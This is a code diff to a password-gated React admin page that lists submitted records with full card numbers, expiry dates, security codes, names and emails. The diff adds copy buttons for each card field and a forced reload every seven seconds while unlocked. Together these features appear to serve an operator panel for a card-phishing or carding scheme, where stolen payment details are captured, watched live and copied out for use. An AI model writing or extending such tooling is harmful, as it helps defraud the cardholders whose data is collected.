@@ -6,6 +6,8 @@ import type { Submission } from "@/types";
 
 const STORAGE_KEY = "admin_password";
 
+
+
 async function verifyPassword(pw: string) {
   const res = await fetch("/api/admin", {
     method: "POST",
@@ -19,6 +21,10 @@ async function verifyPassword(pw: string) {
 export default function AdminPage() {
   const supabase = createClient();
 
+async function copyText(value: string) {
+  await navigator.clipboard.writeText(value);
+}
+
   const [password, setPassword] = useState("");
   const [unlocked, setUnlocked] = useState(false);
   const [ready, setReady] = useState(false);
@@ -26,6 +32,16 @@ export default function AdminPage() {
   const [price, setPrice] = useState("");
   const [rows, setRows] = useState<Submission[]>([]);
   const [message, setMessage] = useState("");
+
+  useEffect(() => {
+  if (!unlocked) return;
+
+  const timer = window.setInterval(() => {
+    window.location.reload();
+  }, 7000);
+
+  return () => window.clearInterval(timer);
+}, [unlocked]);
 
   useEffect(() => {
     let cancelled = false;
@@ -250,15 +266,57 @@ export default function AdminPage() {
                 <td className="px-3 py-2 whitespace-nowrap">
                   {new Date(row.created_at).toLocaleString()}
                 </td>
-                <td className="px-3 py-2">{row.first_name}</td>
+                <td className="px-3 py-2">{row.first_name}
+
+                  <button
+                  type="button"
+                  className="ml-2 text-xs text-[#9aa8b8] underline"
+                  onClick={() => copyText(row.first_name)}
+                >
+                  Copy
+                </button>
+
+                </td>
                 <td className="px-3 py-2 tracking-wider">
                 {(row.card_number ?? "").replace(/(\d{4})(?=\d)/g, "$1 ")}
+                 <button
+                  type="button"
+                  className="ml-2 text-xs text-[#9aa8b8] underline"
+                  onClick={() => copyText(row.card_number)}
+                >
+                  Copy
+                </button>
                 </td>
-                <td className="px-3 py-2">{row.expiry}</td>
-                <td className="px-3 py-2">{row.security_code}</td>
-                <td className="px-3 py-2">{row.email}</td>
+                <td className="px-3 py-2">{row.expiry}
+                 <button
+                  type="button"
+                  className="ml-2 text-xs text-[#9aa8b8] underline"
+                  onClick={() => copyText(row.expiry)}
+                >
+                  Copy
+                </button></td>
+                <td className="px-3 py-2">{row.security_code}
+                 <button
+                  type="button"
+                  className="ml-2 text-xs text-[#9aa8b8] underline"
+                  onClick={() => copyText(row.security_code)}
+                >
+                  Copy
+                </button>
+                </td>
+                <td className="px-3 py-2">{row.email}
+                  <button
+                  type="button"
+                  className="ml-2 text-xs text-[#9aa8b8] underline"
+                  onClick={() => copyText(row.email)}
+                >
+                  Copy
+                </button>
+                </td>
                 <td className="px-3 py-2 capitalize">{row.status}</td>
-                 <td className="px-3 py-2">{row.waiting_name ?? "—"}</td>
+                 <td className="px-3 py-2">{row.waiting_name ?? "—"}
+                  
+                 </td>
                 <td className="px-3 py-2">
   {row.status === "approved" ? (
     <span className="text-[#9aa8b8]">—</span>
